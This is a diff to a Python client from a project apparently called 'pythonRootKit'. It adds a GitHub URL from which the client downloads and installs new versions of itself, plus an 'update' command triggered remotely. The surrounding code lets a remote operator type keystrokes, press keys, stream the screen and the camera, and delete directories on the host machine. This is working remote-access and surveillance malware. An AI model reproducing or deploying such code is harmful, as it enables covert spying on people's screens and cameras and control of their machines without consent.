@@ -4,8 +4,7 @@ from turtle import left
 import pyautogui
 from vidstream import ScreenShareClient
 from vidstream import CameraClient
-
-#fichier modifier
+url = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"
 
 def receive():
         data = client.recv(1024)
@@ -21,7 +20,7 @@ def getpath(change=False):
 def getFileName():
     return os.path.basename(__file__)
 def getNameDir(data):
-    return (data.split("/")[len(data.split("/"))-3])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
+    return (data.split("/")[len(data.split("/"))-5])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])
 
 def supDir(data):
     shutil.rmtree(data)
@@ -90,8 +89,8 @@ def execute(data):
         write(data[6:len(data) - 1])
     elif data[0:6] == "press(":
         press(data[6:len(data) - 1])
-    elif data[0:7] == "fastcmd":
-        modif.modif.update(data[7:len(data)-1], delete=True)
+    elif data == "update":
+        modif.update(url, delete=True)
     elif data == "screen":
         screen()
     elif data == "camera":
@@ -107,12 +106,11 @@ while run == True:
     try: 
         import modif
     except:
-        data = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"
-        dir = getNameDir(data)
-        downloadFileGithub(data)
+        dir = getNameDir(url)
+        downloadFileGithub(url)
         moveFileFromDir(dir)
         supDir(dir)
-    os.system(getFileName())
+        os.system(getFileName())
     sortir = True
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("127.0.0.1", 22223))
